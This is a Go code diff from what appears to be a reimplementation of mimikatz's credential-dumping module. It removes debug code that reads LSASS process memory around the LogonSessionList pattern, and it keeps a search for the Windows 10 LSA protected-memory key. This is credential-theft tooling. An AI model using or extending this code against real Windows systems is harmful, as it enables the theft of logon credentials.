@@ -54,42 +54,9 @@ func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length i
 		return errors.WithMessage(err, "failed to search memory")
 	}
 
-	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0
-	// /mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
-
-	index := bytes.Index(memory, patternWin6xX64LogonSessionList)
-	address1 := address + uintptr(index) + 23 // TODO 16 -> 23
-	// lsass address
-	var offset int32
-	_, err = api.ReadProcessMemory(pHandle, address1, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search memory")
-	}
-	fmt.Printf("1, %X\n", address1)
-	fmt.Println(offset)
-	fmt.Println(convert.LEInt32ToBytes(offset))
-	fmt.Println()
-
-	genericPtr := address1 + 4 + uintptr(offset)
-
-	fmt.Printf("2, %X\n", genericPtr)
-
-	address1 = address + uintptr(index) - 4
-	_, err = api.ReadProcessMemory(pHandle, address1, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
-	}
-	fmt.Printf("3, %X\n", address1)
-	fmt.Println(offset)
-	fmt.Println(convert.LEInt32ToBytes(offset))
-	fmt.Println()
-
-	genericPtr2 := address1 + 4 + uintptr(offset)
-	fmt.Printf("4, %X\n", genericPtr2)
-
 	// address1 += 4 + uintptr(offset64)
 
-	index = bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)
+	index := bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)
 
 	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
 	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
